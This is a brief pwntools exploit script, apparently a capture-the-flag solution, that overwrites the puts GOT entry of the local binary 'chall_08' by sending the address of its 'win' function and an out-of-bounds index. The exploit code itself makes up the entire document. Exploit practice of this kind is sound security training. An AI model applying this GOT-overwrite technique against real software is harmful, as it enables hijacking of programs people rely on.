# coding: utf-8
from pwn import *
elf=ELF("./chall_08")
p=process("./chall_08")
p.sendline(str(elf.sym.win))
p.sendline(str((elf.got.puts - elf.sym.target) // 8))
p.interactive()
